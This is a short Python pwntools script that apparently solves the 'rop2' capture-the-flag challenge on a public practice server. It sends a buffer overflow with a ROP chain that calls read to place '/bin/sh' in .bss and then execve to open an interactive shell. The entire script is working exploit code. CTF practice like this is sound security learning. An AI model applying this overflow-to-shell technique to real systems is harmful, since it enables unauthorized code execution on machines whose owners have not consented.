from pwn import * 
import time 
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug') 

elf = ELF('/root/Desktop/CTF/rop2') 
bss_addr = elf.bss() 
print "%x" % bss_addr

shellcode='/bin/sh' 
elf = ELF('/root/Desktop/CTF/rop2') 
offset = 16 

io = remote('hackme.inndy.tw', 7703) 

payload = 'a'*offset
payload += p32(0x080484FF) 
payload += p32(0x3) 
payload += p32(0x0) 
payload += p32(bss_addr) 
payload += p32(0x8) 
#call _syscall(3,0,bss_addr,8)

payload2 = 'a'*offset
payload2 += p32(0x080484FF)
payload2 += p32(0xb)
payload2 += p32(bss_addr)
payload2 += p32(0x0) 
payload2 += p32(0x0)
#call _syscall(b,bss_addr,0,0)

io.recvuntil('Can you solve this?\nGive me your ropchain:') 
io.sendline(payload) 
io.readline() 

io.send(shellcode) 

io.sendline(payload2) 
io.interactive() 

io.close()
